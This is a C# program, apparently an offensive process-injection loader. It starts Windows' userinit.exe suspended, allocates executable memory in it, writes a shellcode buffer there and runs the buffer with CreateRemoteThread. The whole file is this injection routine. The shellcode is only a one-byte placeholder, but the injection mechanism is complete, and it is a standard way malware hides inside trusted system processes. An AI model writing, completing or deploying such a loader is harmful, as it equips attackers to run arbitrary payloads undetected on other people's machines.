
using System.Diagnostics;
using System.Runtime.InteropServices;
using System;
using System.Text;
public class Program
{
    [StructLayout(LayoutKind.Sequential)]
    public class SecurityAttributes
    {
        public Int32 Length = 0;
        public IntPtr lpSecurityDescriptor = IntPtr.Zero;
        public bool bInheritHandle = false;

        public SecurityAttributes()
        {
            this.Length = Marshal.SizeOf(this);
        }
    }
    [StructLayout(LayoutKind.Sequential)]
    public struct ProcessInformation
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public Int32 dwProcessId;
        public Int32 dwThreadId;
    }
    [Flags]
    public enum CreateProcessFlags : uint
    {
        DEBUG_PROCESS = 0x00000001,
        DEBUG_ONLY_THIS_PROCESS = 0x00000002,
        CREATE_SUSPENDED = 0x00000004,
        DETACHED_PROCESS = 0x00000008,
        CREATE_NEW_CONSOLE = 0x00000010,
        NORMAL_PRIORITY_CLASS = 0x00000020,
        IDLE_PRIORITY_CLASS = 0x00000040,
        HIGH_PRIORITY_CLASS = 0x00000080,
        REALTIME_PRIORITY_CLASS = 0x00000100,
        CREATE_NEW_PROCESS_GROUP = 0x00000200,
        CREATE_UNICODE_ENVIRONMENT = 0x00000400,
        CREATE_SEPARATE_WOW_VDM = 0x00000800,
        CREATE_SHARED_WOW_VDM = 0x00001000,
        CREATE_FORCEDOS = 0x00002000,
        BELOW_NORMAL_PRIORITY_CLASS = 0x00004000,
        ABOVE_NORMAL_PRIORITY_CLASS = 0x00008000,
        INHERIT_PARENT_AFFINITY = 0x00010000,
        INHERIT_CALLER_PRIORITY = 0x00020000,
        CREATE_PROTECTED_PROCESS = 0x00040000,
        EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
        PROCESS_MODE_BACKGROUND_BEGIN = 0x00100000,
        PROCESS_MODE_BACKGROUND_END = 0x00200000,
        CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
        CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
        CREATE_DEFAULT_ERROR_MODE = 0x04000000,
        CREATE_NO_WINDOW = 0x08000000,
        PROFILE_USER = 0x10000000,
        PROFILE_KERNEL = 0x20000000,
        PROFILE_SERVER = 0x40000000,
        CREATE_IGNORE_SYSTEM_DEFAULT = 0x80000000,
    }


    [StructLayout(LayoutKind.Sequential)]
    public class StartupInfo
    {
        public Int32 cb = 0;
        public IntPtr lpReserved = IntPtr.Zero;
        public IntPtr lpDesktop = IntPtr.Zero;
        public IntPtr lpTitle = IntPtr.Zero;
        public Int32 dwX = 0;
        public Int32 dwY = 0;
        public Int32 dwXSize = 0;
        public Int32 dwYSize = 0;
        public Int32 dwXCountChars = 0;
        public Int32 dwYCountChars = 0;
        public Int32 dwFillAttribute = 0;
        public Int32 dwFlags = 0;
        public Int16 wShowWindow = 0;
        public Int16 cbReserved2 = 0;
        public IntPtr lpReserved2 = IntPtr.Zero;
        public IntPtr hStdInput = IntPtr.Zero;
        public IntPtr hStdOutput = IntPtr.Zero;
        public IntPtr hStdError = IntPtr.Zero;
        public StartupInfo()
        {
            this.cb = Marshal.SizeOf(this);
        }
    }
    [DllImport("kernel32.dll")]
    public static extern IntPtr CreateProcessA(String lpApplicationName, String lpCommandLine, SecurityAttributes lpProcessAttributes, SecurityAttributes lpThreadAttributes, Boolean bInheritHandles, CreateProcessFlags dwCreationFlags,
            IntPtr lpEnvironment,
            String lpCurrentDirectory,
            [In] StartupInfo lpStartupInfo,
            out ProcessInformation lpProcessInformation

        );

    [DllImport("kernel32.dll")]
    public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

    [DllImport("kernel32.dll")]
    public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] buffer, IntPtr dwSize, int lpNumberOfBytesWritten);

    [DllImport("kernel32.dll")]
    static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);


    private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
    private static UInt32 MEM_COMMIT = 0x1000;

    public static void Main()
    {
        string binary = "userinit.exe";

        byte[] sc = new byte[1] { 0xfc };

        Int32 size = sc.Length;
        StartupInfo sInfo = new StartupInfo();
        sInfo.dwFlags = 0;
        ProcessInformation pInfo;
        string binaryPath = "C:\\Windows\\System32\\" + binary;
        IntPtr funcAddr = CreateProcessA(binaryPath, null, null, null, true, CreateProcessFlags.CREATE_SUSPENDED, IntPtr.Zero, null, sInfo, out pInfo);
        IntPtr hProcess = pInfo.hProcess;
        IntPtr spaceAddr = VirtualAllocEx(hProcess, new IntPtr(0), size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        int test = 0;
        IntPtr size2 = new IntPtr(sc.Length);
        bool bWrite = WriteProcessMemory(hProcess, spaceAddr, sc, size2, test);
        CreateRemoteThread(hProcess, new IntPtr(0), new uint(), spaceAddr, new IntPtr(0), new uint(), new IntPtr(0));
    }
}